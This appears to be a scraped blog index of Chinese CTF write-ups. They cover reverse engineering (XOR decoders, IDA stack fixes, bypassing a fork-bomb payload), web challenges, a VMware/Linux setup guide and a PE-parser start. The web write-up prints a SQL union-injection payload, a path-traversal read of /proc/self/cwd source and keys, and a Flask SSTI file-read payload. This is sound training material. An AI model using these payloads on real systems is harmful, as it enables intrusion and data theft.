=\u0026#34;\u0026#34; for i in range(len(qwq)-5): f += chr(ord(qaq[i])^6) print(f) #qwq = {DT_n3re} #qaq = onuF{iT_3 解出后，根据字符串的提示，以及题目的提示，知道这是树的中序和后序遍历\n那么需要求出前序遍历\n中序：noiFu{DT_n3re}\n后序：onuF{iT_3}ernD\n求解前序的过程是手写的，这里不再提出\n前序：Dino{Fun_Tr3e}\n即为flag\n题目名称：PaperTiger!!! 出题人:Nameless\n扔进IDA,发现找不到main函数，shift+f12查看字符串,找到关键字符串，双击跟进 鼠标放在这里，按ctrl+X查看交叉引用，即查看哪里用到了这个字符串\n发现F5不好使了，提示sp指针有问题。根据参考资料，调整最后面的堆栈指针\n此时便可F5成功，审计代码知，就是简单的xor而已\n写脚本计算出来即可\n1 2 3 4 5 6 7 key = [0x0, 0x1, 0x2, 0x3, 0x5, 0x5, 0x6, 0x7, 0x8, 0x9, 0xa, 0xb, 0xc, 0xd, 0xe, 0xf, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1c] s2 = \u0026#34;fmcd~qn6=VKT|l~jbE#tqgIE)^roa\u0026#34; flag =\u0026#34;\u0026#34; for i in range(len(key)): flag += chr(ord(s2[i])^key[i]) print(flag) 所以如题，真的是个纸老虎:)\n题目名称：你不会真的要用CE吧 出题人：Gyan\nIDA打开,根据提示，关闭ASLR(如图）\n然后打开od，搜索字符串\n去IDA，按G，随便选上面的一个地址跳转，即可来到主函数\n找到关键代码部分\n查看这句话的地址\n在od中，按ctrl+g跳转到该地址，并按f2下断点,然后f9运行程序\n可以发现程序停在了断点处，修改旁边的标志位，使得跳转不成立\n然后再按一下f9，运行程序，点击确定，发现flag已经出来了\n题目名称：fork bomb bomb bomb！！！ 着手静态 载入IDA 来到主函数进行分析 F5查看伪代码 找到回车前的输出字符串 熟悉C语言就能看出，这里向/tmp目录里面输出了一个文件（.virus） 补充linux里的/tmp目录特点：任何人都可以进行读写，有些linux发行版会在关机后清空/tmp目录。关于linux的使用请参考相关书籍如：鸟哥的linux私房菜 利用system()函数执行了/tmp里的文件，由于linux的mask,/tmp/.virus这个shell脚本是没有执行权限的，所以使用bash调用 /tmp/.virus脚本的内容是一个很经典的fork炸弹，百度就能查到 这个程序的恶意代码和关键代码的耦合性不高，所以咱们能有好几种方法绕过恶意代码，接下来我们尝试使用静态patch和动态调试绕过恶意代码拿到flag，静态逆向写逆向脚本这里不做讨论 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 dwhile ( 2 ) // 这个无线循环的结束条件是下面的goto { system(\u0026#34;nohup bash /tmp/.virus \u0026amp;\u0026#34;); // 执行注入的sfork炸弹 for ( j = 0; j \u0026lt;= (signed int)rand(); ++j ) { for ( k = 0; k \u0026lt;= (signed int)rand(); ++k ) { v13 = (__int64 *)malloc(8LL); *v13 = (signed int)rand() % 93 + 33; v4 = *v13; printf((unsigned __int64)\u0026#34;%c\u0026#34;); } } // 这个for是分配大量的内存和输出随机字符 if ( v13 ) // 这个if判断最后一次的分配空间是否成功 // 成功则开始解密 { v5 = (unsigned int)*(char *)(v12 + v11); // 这里是正式解密代码 switch ( *(char *)(v12 + v11) ) // switch的值在0-4 { case 0: patch1(\u0026amp;v23, v4, v5); // 每次patch调用的形参位置都不一样 goto LABEL_22; // 猜测每个case只执行一次。这样的话，就可以精简下代码 case 1: patch5(\u0026amp;v21, v4, v5);\tgoto LABEL_22; // 这里的patch函数可以尝试进入函数体分析 // 如果直接patch恶意代码就不做演示 case 2: patch9(\u0026amp;v19, v4, v5); goto LABEL_22; case 3: patch13(\u0026amp;v17, v4, v5); goto LABEL_22; case 4: patch17(\u0026amp;v15, v4, v5); LABEL_22: ++v11; // v11从0开始自加 continue; default: // v11超过4之后就goto跳出了循环 goto LABEL_23; } } break; } LABEL_23: v6 = j_strlen_ifunc(\u0026amp;v23); v14 = malloc(5 * (v6 - 1)); if ( !v14 ) { printf((unsigned __int64)\u0026amp;unk_488424); puts(\u0026#34;what a pity!\\n\u0026#34;); exit(0xFFFFFFFFLL); } j_strcat_ifunc(v14, \u0026amp;v23); // strcat函数，可以看出拼接的字符串正好是case里面的内容 j_strcat_ifunc(v14, \u0026amp;v21); j_strcat_ifunc(v14, \u0026amp;v19); j_strcat_ifunc(v14, \u0026amp;v17); j_strcat_ifunc(v14, \u0026amp;v15); putchar(\u0026#39;\\n\u0026#39;); putchar(\u0026#39;\\r\u0026#39;); // 吃掉无意间输入的字符 puts(v14); // v14用strcat了5次 result = getchar(); if ( __readfsqword(0x28u) == v25 ) result = 0; return result;\t静态patch 把73行到84行全部patch掉\n选中87行头，tab键回到流程图，空格看汇编\n记下地址：0x402681\n再f5回到伪代码\n选中73行的system位置，按tab回到流程图，再按空格回到汇编代码\n为了保证平衡，我们在call system上面一条汇编指令lea处\n点ida菜单栏的edit\u0026ndash;\u0026gt;patchprogram\u0026ndash;\u0026gt;assamble\n键入jmp 0x402681,只改这一条，下面的不用管，canel取消\n点ida菜单栏的edit\u0026ndash;\u0026gt;patchprogram\u0026ndash;\u0026gt;aplly\n把patch好的程序拖进linux\n加上执行权限chmod +x ez_virus\n执行./ez_virus\ngdb动态调试 还是刚才看到的那个地址，\ngdb ez_virus\n因为跳了5次，所以我们可能需要更改5次eip（64位叫rip）\n在gdb里面b *0x4025c1设断点\nr运行\n运行到这里的时候，我么需要控制程序流程跳过恶意代码\n在ida里面找到\n由于这里是jz，所以可能不一定会进入正常代码（这里对应的是if(v13)这个变量在恶意代码中是否分配成功）\n所以我们尝试进入下一句汇编（就当他没有跳转，按照程序逻辑，cmp的结果为0（即v13分配成功）则跳转，我们需要cmp的结果不为0,所以，这句需要不执行），则按照汇编流程,下一句的地址是0x402681\n设置eip\nset $eip=0x402681\n这样就跳过了第一次恶意代码\n按c继续程序，程序会再次断在刚才设置的断点\n重复设置eip\nset $eip=0x402681\n再按c继续程序\n重复5次，得到flag\n","date":"2020-11-15T11:25:00Z","permalink":"https://dorinxl.github.io/p/cdut%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98re-wp/","title":"CDUT第一届信安大挑战Re-wp"},{"content":"[第一章 web入门]常见的搜集 硬扫 打开页面提示信息搜集\n扫描就完事了，扫出来robots.txt、index.php~和.index.php.swp\n1 n1book{info_1s_v3ry_imp0rtant_hack} [第一章 web入门]粗心的小李 .git泄露 使用githack或者githacker\n如果用的是githack，使用命令git chechout-index -a来得到index页面\nindex.html:\n1 n1book{git_looks_s0_easyfun} [第一章 web入门]SQL注入-1 常规注入 首先确定是字符型的还是数字型的：\n然后确定字段数量\n常规爆库名、表名、列名\n1 id=-1\u0026#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;fl4g\u0026#39;),(select group_concat(table_name) from information_schema.tables where table_schema=database()) %23 1 n1book{union_select_is_so_cool} [第一章 web入门]SQL注入-2 考报错注入 post方法，直接hackbar里写，用报错注入。\n库是note\n爆表名列名和flag\n[第一章 web入门]afr_1 [第一章 web入门]afr_2 nginx配置错误导致目录穿越 查看静态文件\n直接在img后面加两个.，使目录变为img/..\n读flag [第一章 web入门]afr_3 摘自官方wp 本题考查对linux系统中/proc/目录下文件作用的了解，同时考查了flask模板注入\n请求 http://IP:PORT/article?name=../../../../../proc/self/cmdline获取当前执行系统命令，得到 1 python server.py 请求 http://IP:PORT/article?name=../../../../../proc/self/cwd/server.py获取源码 审计源码，发现flag在flag.py,flask的appkey在key.py,但是此处任意文件读取漏洞被过滤了关键词flag 源码里存在flask SSTI，前提是可以伪造flask的cookie，这里需要用到appkey https://noraj.github.io/flask-session-cookie-manager/ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 @app.route(\u0026#34;/n1page\u0026#34;, methods=[\u0026#34;GET\u0026#34;, \u0026#34;POST\u0026#34;]) def n1page(): if request.method != \u0026#34;POST\u0026#34;: return redirect(url_for(\u0026#34;index\u0026#34;)) n1code = request.form.get(\u0026#34;n1code\u0026#34;) or None if n1code is not None: n1code = n1code.replace(\u0026#34;.\u0026#34;, \u0026#34;\u0026#34;).replace(\u0026#34;_\u0026#34;, \u0026#34;\u0026#34;).replace(\u0026#34;{\u0026#34;,\u0026#34;\u0026#34;).replace(\u0026#34;}\u0026#34;,\u0026#34;\u0026#34;) if \u0026#34;n1code\u0026#34; not in session or session[\u0026#39;n1code\u0026#39;] is None: session[\u0026#39;n1code\u0026#39;] = n1code template = None if session[\u0026#39;n1code\u0026#39;] is not None: \u0026#39;\u0026#39;\u0026#39; 这里存在SSTI \u0026#39;\u0026#39;\u0026#39; template = \u0026#39;\u0026#39;\u0026#39;\u0026lt;h1\u0026gt;N1 Page\u0026lt;/h1\u0026gt; \u0026lt;div class=\u0026#34;row\u0026gt; \u0026lt;div class=\u0026#34;col-md-6 col-md-offset-3 center\u0026#34;\u0026gt; Hello : %s, why you don\u0026#39;t look at our \u0026lt;a href=\u0026#39;/article?name=article\u0026#39;\u0026gt;article\u0026lt;/a\u0026gt;? \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026#39;\u0026#39;\u0026#39; % session[\u0026#39;n1code\u0026#39;] session[\u0026#39;n1code\u0026#39;] = None return render_template_string(template) 所以请求 http://IP:PORT/article?name=../../../../../proc/self/cwd/key.py获取appkey\n伪造cookie为SSTI的payload获取flag. 1 {{\u0026#39;\u0026#39;.__class__.__mro__[2].__subclasses__()[40](\u0026#39;flag.py\u0026#39;).read()}} ","date":"2020-11-13T05:23:00Z","permalink":"https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/","title":"Nu1LBook第一章wp"},{"content":"前言 本文写给刚刚入门的安全学子，对Linux和VMWare做一个简单的介绍。\n在学习安全的道路上，我们需要很多利器来帮助自己修炼。不管你是什么方向，总会需要借助各种神奇而强大的工具来学习进步。在此篇文章中，你将认识到另一种操作系统：Linux，并对操作系统这一概念有一初步了解。此外，这篇文章还会像各种攻略一样指导你安装VMWare Workstation，并在此基础上安装ubuntu。\n关于Linux 如果你在各种搜索引擎上搜索“Linux”，那么你将得到很多生涩而且难以理解的词语组成的难以消化的句子。但是问题不大，当你真正开始使用他的时候你就会对linux产生自己的理解。如果对操作系统这一概念及相关知识很感兴趣，那么你完全可以在浩瀚的网络世界中寻找资料开始自学。在后续的学习中学院也会开设相应课程。\n火焰病毒学长已经在协会的博客中介绍过Linux，此处我便不再赘述\u0026ndash;\u0026gt; ​Why Linux?\n关于VMWare \u0026ndash;\u0026gt;什么是VMWare? VMware是“虚拟PC”软件公司，提供服务器、桌面虚拟化解决方案。该公司旗下有多款产品，其中VMware Workstation产品一直受到全球广大用户的认可，它的产品可以使你在一台机器上同时运行二个或更多Windows、DOS、Linux、Mac系统。\nVMWare Workstation作为一款功能强大的桌面虚拟计算机软件，为用户提供可在单一的桌面上同时运行不同的操作系统，和进行开发、测试、部署新的应用程序的最佳解决方案。\n与“多启动”系统相比，VMware采用了完全不同的概念。多启动系统在一个时刻只能运行一个系统，在系统切换时需要重新启动机器。VMware是真正“同时”运行多个操作系统在主系统的平台上，就像标准Windows应用程序那样切换。而且每个操作系统你都可以进行虚拟的分区、配置而不影响真实硬盘的数据，你甚至可以通过网卡将几台虚拟机用网卡连接为一个局域网，这一切不会影响你的主机操作和任何操作系统或者其它正在运行的应用程序。极其方便。\n简单来说，VMWare是很牛逼的公司，他家有很多很牛逼的产品，我们在学习安全的过程中需要用到他家的东西，他家的东西我们不仅要用，还要用好。\n\u0026ndash;\u0026gt;VMWare Workstation的安装 VMware Workstation Pro16是在单个Linux或Windows PC上以虚拟机（VM）形式运行多个操作系统的行业标准。为任何设备、平台或云构建、测试或演示软件的IT专业人员、开发人员和企业都依赖Workstation Pro。\nVMware Workstation Pro16虚拟机不知不觉更新到了16了，与时俱进，一起来安装VMware Workstation Pro16。\n官方下载地址：https://www.vmware.com/products/workstation-pro.html\n安装步骤 双击下载的应用程序文件，点击下一步。\n勾选协议条款，点击下一步。\n勾选增强型键盘驱动程序，并更改软件安装目录，如果你想默认安装到c盘可以不用更改。（不过建议一定要好好整理自己的各类文件夹，内存不够就加盘，分类明确更有助于使用电脑）\n用户体验设置：看自己的意愿了。\n快捷方式：看自己的意愿了。\n点击安装。\n点击完成，安装完毕！\n提示重启启动，选择是重启系统。\n打开Vmware Workstation Pro16,，提示输入秘钥，否则会试用期是30天使用时间。（关于秘钥，作为学生大概是买不起的，但是方法总比困难多，咳咳）\n至此，Vmware Workstation Pro16已经完成安装和激活。\n关于虚拟机 \u0026ndash;\u0026gt;什么是虚拟机？(Virtual Machine) 简单点说，我们安装了VMWare Workstation，也就相当于安装好了底座，现在我们要在此基础上添加操作系统作为虚拟机使用。装好之后我们就可以在windows上玩linux或者其他别的什么了。\n\u0026ndash;\u0026gt;安装你的系统(以ubuntu16.04为例) 前期准备： VMware Workstation 镜像文件(想要在vm上运行其他的系统，我们需要镜像文件(.iso)来作为安装介质。) それでは、ゲームを始めましょう! 安装步骤： 下载VM（已完成，这里是vm14版本的，最新的16版步骤都差不多）\n下载镜像文件。这里推荐几个下载网址：\n官方：[https://www.ubuntu.com/download]\n中科大源：[http://mirrors.ustc.edu.cn/ubuntu-releases/16.04/]\n阿里云开源镜像站：[http://mirrors.aliyun.com/ubuntu-releases/16.04/]\n兰州大学开源镜像站：[http://mirror.lzu.edu.cn/ubuntu-releases/16.04/]\n北京理工大学开源：[http://mirror.bit.edu.cn/ubuntu-releases/16.04/]\n浙江大学：[http://mirrors.zju.edu.cn/ubuntu-releases/16.04/]\n新建虚拟机：\n如果想要自己完整的安装ubuntu系统则需要选择\u0026quot;自定义\u0026quot;, 想懒省事话选择\u0026quot;典型\u0026quot;。（建议手动一步一步安装）\n选择稍后安装操作系统，然后点击下一步\n客户机操作系统 选择 Linux，版本 Ubuntu 64位(因为下载的是64位的系统，如果是 32位的，选择 Ubuntu)\n输入 虚拟机名称 和 安装位置，然后点击下一步（前面提到的磁盘空间分类很重要）\n配置处理器，我的CPU是i5-9300H, 4核8线程, 我就按照一半来设置了\n为虚拟机分配内存，由于我电脑配置原因我选择分配给虚拟机 4GB内存，这个按照个人电脑配置选择就行\n网络连接方式使用默认的即可, 后期有需要可在\u0026quot;虚拟机\u0026quot;-\u0026gt;\u0026ldquo;设置\u0026quot;中更改,这里不多作解释.\n为虚拟机分配磁盘大小，按照个人电脑配置选择，不知道分配多少可以在自动推荐的大小上加10G。（是不是在考虑加个盘了？）\n勾选\u0026quot;立即分配所有磁盘空间\u0026quot;会导致在在设置完成后花费较长时间分配完整空间, 如果没有特殊需求, 不推荐。\n单/多个文件可根据自己选择,但总的来说,默认就好。\n这里点击 自定义硬件 按钮，因为在步骤5选择安装来源的时候，我们选择了稍后安装操作系统，所以在这里我们会选择系统镜像的路径。\n这里配置系统镜像路径，也可以在配置完虚拟机后再编辑，也就是在一开始的界面上面的菜单栏里点击 编辑此虚拟机 ，一样可以进入到下一步的配置界面：\n点击 新CD/DVD，在右边的连接部分选择 使用 ISO 映像文件，点击 浏览 按钮，选择安装的操作系统，然后点击 关闭 退出配置界面：\n点击 完成：\n开启虚拟机进行初始化：\n之后便是安装ubuntu的过程。\n到此为止已经成功了一大半了，剩下的便请你们自行摸索，好好利用各种搜索引擎寻找资料。\n注意在第一次成功进入之后可以拍摄快照保留环境，以防之后在进行骚操作的时候把系统玩崩没办法还原。\n关于快照：大可理解为存档，拍摄了快照就是保存了存档，如果后面出现了不可挽救的错误便可以恢复存到到灾难还没发生之前。\n结语 \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;Linux对于小白来说可能是一片新世界，对一年前的我而言就是如此。不过，在不断学习的道路中我们终究会认识他，了解他。安全的门槛说高不高说低不低，只要坚持不懈，用心钻研，小白也会成长为很厉害的大佬。 ~~(被千人捧，被万人膜)~~ 整篇文章说白了就是引导信息搜集。网上有很多资料可供学习，我在这里仅仅是将他们整理了一下放了出来。学习安全的道路也是不断折腾的道路，我们会遇到很多很多奇形怪状不可名的问题，这个时候应该养成良好的解决问题的思路，遇到问题先做什么在做什么。不仅是学习安全，有了自己的一套解决问题的方法，在日常生活中也会起很大帮助。\n","date":"2020-10-04T07:34:00Z","permalink":"https://dorinxl.github.io/p/linux%E5%92%8Cvmware/","title":"Linux和VMWare"},{"content":"F5的时候遇到以下问题 1. 按空格，找到出错地址 2. 双击进入函数，然后退出再F5，恢复正常 原因是因为IDA不能正确识别这个call的参数，或者是参数出错。 3. F5之后解题 简单的XOR加密一下，从0到len-1对每一位进行运算，逆着推一边就出flag。 1 2 3 4 5 6 7 8 9 #include\u0026lt;iostream\u0026gt; #include\u0026lt;cstring\u0026gt; using namespace std; int main(){ char s[] = \u0026#34;MSAWB~FXZ:J:`tQJ\\\u0026#34;N@ bpdd}8g\u0026#34;; for(int i = 0;i \u0026lt; strlen(s);i++){ cout\u0026lt;\u0026lt;(char)(s[i] ^ i); } } flag:MRCTF{@_R3@1ly_E2_R3verse!} ","date":"2020-09-13T11:07:00Z","permalink":"https://dorinxl.github.io/p/mrctfxor/","title":"【MRCTF】Xor"},{"content":"有时候，或者说经常，我们会在F5的时候遇到栈帧不平衡的问题。每每这种时候就需要我们手动alt+k调整栈帧。 我曾经非常苦恼，这是个什么玩意，我到底该怎么调整栈帧。网上查了很多资料很多博客，但我都觉得难以理解，而且难以操作。 后来我无意间看到一篇博客，说只要用他的方法，调整栈帧是很容易的一件事，我尝试了，确实如此。但是我忘了这篇博客是哪位师傅写的，也找不到了。于是我决定记录一下，留给像我这样的小白看。 调整栈帧遇到的必然是这样一张图：\n第一步 打开Options-\u0026gt;General-\u0026gt;Stack pointer 第二步 找红色的区域 如果遇到栈帧不平衡而F5不能的情况，我们需要在图形视图找到这样一处(或几处)红色的区域： 第三步 按空格识别代码块 第四步 ALT+K 盘他 如果不知道改成多少的话，可以一次一次尝试，反正把最下面的-04改成0以上就能F5了。 ","date":"2020-09-12T10:37:00Z","permalink":"https://dorinxl.github.io/p/ida-%E8%B0%83%E6%95%B4%E6%A0%88%E5%B8%A7-411a04positive-sp-value-has-been-found/","title":"IDA 调整栈帧 (411A04:positive sp value has been found)"},{"content":"主要记录一下第一次使用jeb的过程，题目本身还是蛮简单的。 1. 下载JEB 在52的爱盘里就有。 2. 配置JDK JEB支持的JDK版本是121及以下，用最新的打开JEB会出现奇怪的问题。 可以百度找jdk-8u121-windows-x64.exe 3 .修改jeb_wincon.bat的内容 我是在windows上装的jeb，其还支持linux和mac 只要添加一句set JAVA_HOME = 你安装jdk的路径就可 4. 双击jeb_wincon.bat开始运行 到这里就可以打开jeb了。 5. 分析源码 加载文件，把反汇编选项打开，核心内容就这一点： 6. 解出flag 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #include\u0026lt;iostream\u0026gt; using namespace std; int main(){ int v9 = 2; int v11 = 31; char v5[] = \u0026#34;dd2940c04462b4dd7c450528835cca15\u0026#34;; v5[v9] = ((char)(v5[v9] + v5[3] - 50)); v5[4] = ((char)(v5[v9] + v5[5] - 48)); v5[30] = ((char)(v5[v11] + v5[9] - 48)); v5[14] = ((char)(v5[27] + v5[28] - 97)); int v4; for(v4 = 0; v4 \u0026lt; 16; ++v4) { char v0 = v5[31 - v4]; v5[31 - v4] = v5[v4]; v5[v4] = v0; } for(int i = 0;i \u0026lt; 32;i++){ cout\u0026lt;\u0026lt;v5[i]; } } flag{59acc538825054c7de4b26440c0999dd}\n","date":"2020-09-12T00:00:00Z","permalink":"https://dorinxl.github.io/p/buu%E7%AE%80%E5%8D%95%E6%B3%A8%E5%86%8C%E5%99%A8/","title":"【BUU】简单注册器"},{"content":"2020年\u0026quot;安洵杯\u0026quot;四川省大学生信息安全技术大赛\n部分 WRITEUP\n一、战队信息\n战队名称：成都理工大学二队\n战队排名：第八名 743分\n二、解题情况 第一天：web两道、misc一道、pwn一道\n第二天：攻下两处、misc一到、密码一道\n三、解题过程\n由于我是逆向选手，而这次逆向完全没有做出来，倒是做出来个pwn，剩下的时间就是钻misc和密码，所以我仅列出我个人做出来的题目。还望各位大佬轻喷。\n1 北二街恰醉鸡（fakepwn） 操作内容： IDA进入main函数，找到granblue()函数，进入。\n里面有很多数据，其中一串最显眼：\n转换成字符格式：\n得到flag\nflag值： flag{ac3850d256c1842f } 2 开始抑郁 操作内容： 我是真的抑郁了。\n开局一张图：\n一张图片这么大，必有蹊跷：\n本来是用binwalk看看里面是什么东西，后来发现把后缀直接zip来得更快：\n里面是一个包和一张图，先看看图片：\n用010打开看看，果不其然文件头需要修复：\n修复后：\n我们再次打开看看，图片变成了二维码：\n扫码后得到brainfuck加密的东西：\n接着再用jsfuck解密：\n得到一个时间：20200824152800\n至此，TIME.png里隐藏的信息已经被发现\n我们再来看另一个包，里面有一张图，还有一个加密的图片：\n考虑到刚刚得到的时间，我们把这段数字输入尝试是否正确，可惜并不对。\n由于我们看出这是一段时间，索性尝试一下与时间最接近的时间戳：\n这次正确了，拿出图片：\n大小很大的一张图，图片是跳舞的小人，是福尔摩斯跳舞人像的密码，解读之后是：\nWATCHTHEVIDEO\nVideo?哪里来的video让我看？\n这次需要从binwalk中取出来了，直接修改后缀不管用。\n从binwalk中可以提取出一张图片和一个文件夹：\n确实，这个flag.png需要修复，跟上面一样，修复之后是这个样子：\n文件夹里是这个样子：\n这里卡了很久，我完全搞不懂你的名字和篮球和狗有什么联系。\n抑郁了，这次真的抑郁了。在中午吃饭的时候还想着球员衣服上的数字是不是和你的名字的时间轴有关系：\n看得出来大家也挺抑郁的。\n后来在队友的帮助下，把这只狗图的高调大，看到了了不得的东西：\n我直接就把这个交了，结果不对，从希望的边缘掉了下去。\n冷静了一下，这个如果是flag格式，球员衣服数字是时间轴，那么是不是应该在你的名字电影里找找线索呢？\n然后就找到了：\n连起来就好了，注意大小写\nflag值： flag{0725-2016-GRANDMENU-RCHITECTURE-1335} 3 国王与小麦 操作内容： Base91加密，解密之后：\n得到一堆数字，考虑是摩斯密码，找个牛逼网站解密：\n想想国王与小麦讲的故事，第一个格子放一袋米，第二个放前面一个格子的两倍，六十四个个子是放不完的。所以这些数字是2的各个次方！\n于是转换为：\n25,38,49,33,25,55,45,53, 12,23,12,49,23,51,5,51,23,55,13,47,28,53,60,49,25,22, 5,25,23,54,9,33,13,35,17,61\n显然这也不是flag，比赛最后十分钟的时候灵感爆发，觉得这些和base64的转换表有关系，于是手动转换：\nZmxhZ3t1MXMxXzFzX3Nvc18xZWFZX2JhNjR9\n扔进在线网站：\n可真是有够刺激的。\nflag值： flag{u1s1_1s_sos_1eaY_ba64}\n4 yang 操作内容： 这个我感觉做到最后就差一步了，然鹅没做出来，就很可惜。\n这个歌曲是用MP3Stego写入内容了，那就用这个程序解密。\n然而解密需要密码，其实很简单，密码的问题已经写出来了：\n在属性里，有个i-soon chengli time，也就是在问安洵公司成立的时间，百度可以知道是2015年3月31日，也就是20150331。\n然后我们去解密：\n得到与佛论禅：\n一看是504B0304开头的，下意识感觉是个zip的压缩包数据，于是用16进制编辑器打开看看。这里折磨了半天，不知道怎么把十六进制导入，后来看着英文搞懂了，先复制好，然后再点这个：\n就产生了zip的压缩包:\n这个包是真的加密不是伪加密，用爆破工具爆破开了，然而…\n给了提示我还是不懂啊！\n呜呜呜\n","date":"2020-09-08T14:36:00Z","permalink":"https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/","title":"2020年“安洵杯”四川省大学生信息安全技术大赛  部分WRITEUP"},{"content":"想给pycharm加个gmpy2的库，结果不能直接从设置里安装，很气。上网搜，都是手动添加。\n那我也来手动添加，结果发现pip的所有指令都报【Fatal error in launcher: Unable to create process using \u0026lsquo;\u0026quot;\u0026rsquo;】\n然后又去找解决方法，卸载重装都不管事。\n看到一种方法是在python的安装包里选择repair修复，于是我兴冲冲的去官网下载安装包，结果根本没有选项。\n最后我打算卸载py重装的时候，看见了这个：\n当机立断点进去\n我他妈直接repair，然后就修好了，pip姬恢复了被玩坏之前的样子呢~\n","date":"2020-08-28T02:02:00Z","permalink":"https://dorinxl.github.io/p/pip%E6%8A%A5fatal_error_in_launcher__unable_to_create_process_using/","title":"pip报【Fatal_error_in_launcher__Unable_to_create_process_using】"},{"content":"记录一下C语言写的简单的PE文件分析器。\n边学边做的，有些地方有疏漏了还请指点。\n我按照《逆向工程核心原理》这本书给出的大体结构对各部分内容进行输出，下面记录一下我遇到的难题和一些值得注意的点。\n一、\n分析一个pe文件要做的第一件事就是把这个文件加载到内存中，也就是文件映射。\n这里我用的代码是：\nchar FilePath[] = \u0026ldquo;E:\\\\test\\\\notepad.exe\u0026rdquo;;\nHANDLE hFile = CreateFileA(FilePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\nHANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, 0, NULL);\nPVOID pbFile = MapViewOfFile(hMapping, FILE_MAP_ALL_ACCESS, 0, 0, 0);\n把FilePath[]内容改成需要分析的pe文件的路径即可。\n然后我们准备分析一个文件的DOS头、NT头、输入表输出表，其他内容暂且不分析。\n一个DOS头的内容如下：\n作为一个结构体，每个PE文件的DOS头长度不定，但是e_lfanew的值应该都是3cH。\n二、\n如何找到并输出DOS头。\n在网络上搜集各种资料观察各种大牛的代码后我发现，当我把文件映射之后，可以直接定义DOS头的入口：\n这也让我对文件的本质和C语言编程多了一些理解，事实上这也是我第一次接触这种很像windows编程的小程序。\n直接用系统已经给出的结构体定义去声明一个DOS头，然后我们就可以以指针的形式去访问内部成员。\n这里我又遇见了第三个问题，实际上这个问题应该是在映射文件前就该遇到了：\n三、\n刚开始的时候我并不明白这些DWORD、HANDLE都是些什么东西，查过资料后明白了，不过是和int、char这些东西一样，只是微软把他们typedef成了其他名称，本质还是一些基础的数据定义。\n搞清楚这个之后我们对于DOS头甚至是之后的整体文件就能有个大概的认识了。这些支离破碎的二进制被我们观测为十六进制，再加以联系组成一块一块的结构，最后一起拼接成了一个PE文件。\n访问DOS头的成员：\nprintf(\u0026quot;==================================PE DOS HEADER===================================\u0026quot;);\nprintf(\u0026quot;\\ne_magic: 0x%04X\u0026quot;, pDosHeader-\u0026gt;e_magic);\nprintf(\u0026quot;\\ne_cblp: 0x%04X\u0026quot;, pDosHeader-\u0026gt;e_cblp);\nprintf(\u0026quot;\\ne_cp: 0x%04X\u0026quot;, pDosHeader-\u0026gt;e_cp);\nprintf(\u0026quot;\\ne_crlc: 0x%04X\u0026quot;, pDosHeader-\u0026gt;e_crlc);\nprintf(\u0026quot;\\ne_cparhdr: 0x%04X\u0026quot;, pDosHeader-\u0026gt;e_cparhdr);\nprintf(\u0026quot;\\ne_minalloc: 0x%04X\u0026quot;, pDosHeader-\u0026gt;e_minalloc);\nprintf(\u0026quot;\\ne_maxalloc: 0x%04X\u0026quot;, pDosHeader-\u0026gt;e_maxalloc);\nprintf(\u0026quot;\\ne_ss: 0x%04X\u0026quot;, pDosHeader-\u0026gt;e_ss);\nprintf(\u0026quot;\\ne_sp: 0x%04X\u0026quot;, pDosHeader-\u0026gt;e_sp);\nprintf(\u0026quot;\\ne_csum: 0x%04X\u0026quot;, pDosHeader-\u0026gt;e_csum);\nprintf(\u0026quot;\\ne_ip: 0x%04X\u0026quot;, pDosHeader-\u0026gt;e_ip);\nprintf(\u0026quot;\\ne_cs: 0x%04X\u0026quot;, pDosHeader-\u0026gt;e_cs);\nprintf(\u0026quot;\\ne_lfarlc: 0x%04X\u0026quot;, pDosHeader-\u0026gt;e_lfarlc);\nprintf(\u0026quot;\\ne_ovno: 0x%04X\\n\u0026quot;, pDosHeader-\u0026gt;e_ovno);\nfor (int i = 0; i \u0026lt;= 3; i++) {\nprintf(\u0026ldquo;e_res[%d]: 0x%04X \u0026ldquo;,i, pDosHeader-\u0026gt;e_res[i]);\n}\nprintf(\u0026quot;\\ne_oemid: 0x%04X\u0026rdquo;, pDosHeader-\u0026gt;e_oemid);\nprintf(\u0026quot;\\ne_oeminfo: 0x%04X\\n\u0026rdquo;, pDosHeader-\u0026gt;e_oeminfo);\nfor (int i = 0; i \u0026lt;= 9; i++) {\nif (!(i % 4) \u0026amp;\u0026amp; i) printf(\u0026quot;\\n\u0026quot;);\nprintf(\u0026ldquo;e_res[%d]: 0x%04X \u0026ldquo;, i, pDosHeader-\u0026gt;e_res2[i]);\n}\nprintf(\u0026quot;\\ne_lfanew: 0x%08X\\n\u0026rdquo;, pDosHeader-\u0026gt;e_lfanew);\nprintf(\u0026quot;\\n==================================PE NT HEADER===================================\u0026rdquo;);//大小为F8 PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS32)((DWORD)pbFile + pDosHeader-\u0026gt;e_lfanew);\nprintf(\u0026quot;\\nSignature: 0x%08X\u0026quot;, 